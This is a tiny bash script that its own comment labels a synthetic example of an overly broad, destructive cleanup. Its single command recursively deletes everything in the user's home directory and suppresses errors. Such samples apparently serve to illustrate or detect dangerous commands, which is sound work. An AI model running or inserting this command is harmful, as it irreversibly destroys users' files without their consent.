#!/usr/bin/env bash
# Synthetic example: an overly broad, destructive cleanup.
rm -rf "$HOME"/* 2>/dev/null || true
